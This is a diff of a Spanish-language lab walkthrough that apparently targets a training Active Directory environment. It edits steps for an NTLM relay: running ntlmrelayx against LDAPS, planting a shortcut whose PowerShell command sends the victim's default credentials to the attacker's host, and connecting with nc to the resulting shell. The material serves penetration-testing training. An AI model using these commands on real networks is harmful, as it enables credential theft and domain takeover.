@@ -281,12 +281,12 @@ Leyendo el archivo comprendemos que esta ruta se usa para una automatización la
 Vamos a aprovecharnos de esto usando *GPOddity*
 En primer lugar tendremos que usar *ntlmrelayx* que la ejecutaremos en la maquina WSL Ubuntu para obtener las credenciales del usuario devopsadmin
 ```shell
-sudo ntlmrelayx.py -t ldaps://172.16.2.1 -wh 172.16.100.97 --http-port '80,8080' -i --no-smb-server
+sudo ntlmrelayx.py -t ldaps://172.16.2.1 -wh 172.16.100.97 --http-port '8081' -i --no-smb-server
 ```
 
 Una vez ejecutado en nuestra maquina virtual deberemos de crear en la ruta de AD\Tools un acceso directo con el siguiente payload
 ```shell
-C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke-WebRequest -Uri 'http://172.16.100.97' -UseDefaultCredentials"
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke-WebRequest -Uri 'http://172.16.100.97:8081' -UseDefaultCredentials"
 ```
 
 Y lo copiaremos al recurso compartido dcoro-ci\AI
@@ -294,4 +294,7 @@ Y lo copiaremos al recurso compartido dcoro-ci\AI
 xcopy C:\AD\Tools\student97.lnk \\dcorp-ci\AI
 ```
 
-La automatización ejecutara el archivo y se creara una conexión
+La automatización ejecutara el archivo y se creara una conexión en caso de no hacerse solo le podemos hacer doble click nosotros, nos mostrara un mensaje de que se ha automatizado una conexión en el 127.0.0.1:11000 nos abriremos una nueva WSL y nos conectaremos
+```shell
+nc 127.0.0.1 11000
+```
